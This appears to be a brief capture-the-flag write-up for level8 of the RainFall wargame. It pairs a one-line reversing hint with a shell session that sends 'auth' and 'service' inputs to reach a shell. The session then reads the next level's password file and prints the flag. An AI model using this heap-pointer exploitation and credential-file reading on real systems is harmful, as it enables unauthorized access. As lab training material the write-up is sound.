If we reverse the code both of the strings have to got a value and the 8th char of auth the first string have to be 0

```sh
level8@RainFall:~$ ./level8 
(nil), (nil) 
auth 
0x804a008, (nil) 
service
0x804a008, 0x804a018 
auth
0x804a008, 0x804a018 
auth
0x804a008, 0x804a018 
service
0x804a008, 0x804a028 
login
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```